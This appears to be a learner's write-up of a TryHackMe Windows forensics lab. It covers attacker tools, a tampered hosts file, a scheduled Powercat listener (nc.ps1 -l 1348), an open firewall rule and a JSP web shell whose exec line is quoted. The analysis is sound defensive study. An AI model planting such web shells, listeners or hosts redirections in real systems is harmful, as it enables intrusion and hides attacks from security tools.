# Investigating Windows – Windows Host Compromise Investigation

**Platform:** TryHackMe  
**Environment:** Windows Server 2016  
**Focus:** Windows forensics, persistence, credential access, web shells and network manipulation.

## 1. Overview

The objective of this challenge was to investigate a previously compromised Windows Server and identify evidence of attacker activity.

I examined suspicious files, scheduled tasks, the hosts file, web server files and firewall rules using PowerShell, File Explorer, Task Scheduler and WordPad.

## 2. Investigation Findings

### 2.1 Suspicious files in `C:\TMP`

I used PowerShell to list the files and compare their creation and modification timestamps.

```powershell
Get-ChildItem C:\TMP -Force |
Sort LastWriteTime |
Select Name, Length, CreationTime, LastWriteTime
```

Several files stood out:

| File | Purpose |
|---|---|
| `WMIBackdoor.ps1` | WMI persistence script |
| `nbtscan.exe` | NetBIOS network scanning |
| `mim.exe` | Mimikatz (credential theft) |
| `nc.ps1` | PowerShell netcat / Powercat |
| `schtasks-backdoor.ps1` | Scheduled-task persistence |
| `xCmd.exe` | Command execution utility |
| `mim-out.txt` | Mimikatz output |
| `d.txt`, `p.exe` | Purpose not established |

**Interesting observation:** All these files shared a LastWriteTime of approximately 4:37:37 PM, despite having different CreationTime values between 4:44 PM and 4:47 PM.

This could indicate that the files were copied or extracted while retaining their original modification timestamps.

The collection of tools suggested activity involving credential theft, network discovery, command execution and persistence.

**Screenshot 1 – Suspicious files and timestamps**

<img width="1073" height="219" alt="Screenshot from 2026-10-29 07-36-08" src="https://github.com/user-attachments/assets/f4a14b17-d1f5-4c01-a009-e5289c8ac1d0" />


### 2.2 Modified hosts file

Location:

`C:\Windows\System32\drivers\etc\hosts`

I found several unusual entries:

```text
10.2.2.2 update.microsoft.com

127.0.0.1 www.virustotal.com
127.0.0.1 www.www.com
127.0.0.1 dci.sophosupd.com

76.32.97.132 google.com
76.32.97.132 www.google.com
```

The hosts file maps domain names to IP addresses and can override normal DNS resolution.

For example, the Google entries redirected requests for `google.com` to `76.32.97.132`.

Other entries redirected security-related websites to `127.0.0.1` (localhost), potentially preventing access to legitimate security services.

The CTF identified `76.32.97.132` as the attacker's external command-and-control IP.

**Key takeaway:** Attackers can manipulate the hosts file to redirect traffic or interfere with security tools.

**Screenshot 2 – Modified hosts file**
<img width="887" height="696" alt="Screenshot from 2026-10-29 10-37-06" src="https://github.com/user-attachments/assets/55b09fd6-2587-4a20-819e-c0209cade594" />

### 2.3 Web shell in `C:\inetpub\wwwroot`

I found three files in the IIS web directory:

- `b.jsp`
- `tests.jsp`
- `shell` (GIF)

I opened `tests.jsp` in WordPad and found code that accepted commands through an HTTP parameter called `cmd`.

The important line was:

```java
Runtime.getRuntime().exec(request.getParameter("cmd"));
```

This takes a command supplied through a web request and executes it on the server.

For example, a request containing `?cmd=whoami` could execute the `whoami` command, assuming the JSP was running in a compatible environment.

This is characteristic of a **web shell**: a malicious server-side script that allows someone to execute commands on a server through its web application.

**Key takeaway:** Looking at the actual contents of a file can reveal malicious functionality that its filename alone wouldn't tell me.

**Screenshot 3 – Files discovered in wwwroot**
<img width="871" height="797" alt="Screenshot from 2026-10-29 10-49-00" src="https://github.com/user-attachments/assets/59cf4166-5dc3-4f0a-899c-1db2f1e3d810" />


**Screenshot 4 – tests.jsp code**

<img width="881" height="875" alt="Screenshot from 2026-10-29 10-54-27" src="https://github.com/user-attachments/assets/467b8d34-6ee4-486e-9952-7f66b4d357b4" />


### 2.4 Malicious scheduled task

I identified a scheduled task named:

`Clean file system`

It was configured to run daily and execute:

```powershell
C:\TMP\nc.ps1 -l 1348
```

`nc.ps1` is associated with Powercat, a PowerShell implementation of netcat.

The `-l` argument specifies listening mode, meaning the script was configured to listen locally on port `1348`.

This was suspicious because:

- It executed a networking utility from `C:\TMP`.
- It established a listening endpoint.
- It ran automatically through Task Scheduler.
- Its harmless-sounding name disguised its actual functionality.

This is an example of **persistence**: using an automated mechanism to maintain access or execute malicious activity without manually starting the command each time.

### 2.5 Suspicious firewall rule

I also found an inbound firewall rule named:

`Allow outside connections for development`

Its configuration was:

| Property | Value |
|---|---|
| Profile | Public |
| Action | Allow |
| Protocol | TCP |
| Local port | 1337 |
| Remote address | Any |
| Program | Any |

This rule allowed incoming TCP connections on port 1337 from any remote address.

It was suspicious because it permitted broad inbound access on a public network profile.

The CTF identified port 1337 as the last port opened by the attacker.

**Important distinction:** Port 1337 was associated with the firewall rule, while port 1348 was the listener configured in the malicious scheduled task.

**Screenshot 5 – Inbound firewall rule**

<img width="1510" height="123" alt="Screenshot from 2026-10-29 11-01-38" src="https://github.com/user-attachments/assets/7cbce649-dbeb-448f-bcfa-544404bd72c5" />

## 3. Incident Timeline

All times are from 03/02/2019 and use the machine's displayed local time.

| Time | Finding |
|---|---|
| 4:04:49 PM | Event ID 4672: special privileges assigned to a new logon session. |
| 4:37:37 PM | Common LastWriteTime for suspicious files and web server files. |
| 4:44:51 PM | `d.txt` created. |
| 4:45:03 PM | `nc.ps1` and `nbtscan.exe` created. |
| 4:45:08 PM | `WMIBackdoor.ps1` created. |
| 4:45:19 PM | `mim.exe` created. |
| 4:45:27 PM | `mim-out.txt` created. |
| 4:46:37 PM | `p.exe` created. |
| 4:46:51 PM | `xCmd.exe` created. |
| 4:47:04 PM | `schtasks-backdoor.ps1` created. |

The timestamps suggest that several attacker-related tools were introduced within a short period.

The shared modification time of 4:37 PM and later creation times are worth distinguishing: they do not necessarily represent the exact order of attacker execution.

## 4. Other CTF Findings

| Question | Answer |
|---|---|
| Windows version | Windows Server 2016 |
| Last logged-in user | Administrator |
| John's last logon | 03/02/2019 5:48:32 PM |
| Initial connection IP | 10.34.2.3 |
| Other administrative accounts | Guest, Jenny |
| Jenny's last logon | Never |
| Compromise date | 03/02/2019 |
| Privileged logon event | 03/02/2019 4:04:49 PM |
| Credential theft tool | Mimikatz |
| Attacker's external IP | 76.32.97.132 |
| Web shell extension | .jsp |
| Last port opened | 1337 |
| Targeted website | google.com |

## 5. What I Learned

- **File timestamps:** Comparing creation and modification times can reveal relationships between suspicious files.
- **Persistence:** Scheduled tasks can automatically execute commands, and their actual actions matter more than their names.
- **Hosts file:** Local hostname mappings can be manipulated to redirect traffic.
- **Web shells:** Server-side scripts can provide attackers with remote command execution.
- **Firewall rules:** Unusual inbound allowances can reveal attempts to expose services or facilitate connections.

**Overall takeaway:** A Windows investigation involves connecting different artifacts rather than looking at each one in isolation. Files, scheduled tasks, configuration changes and network settings each reveal a different part of what happened on the machine.
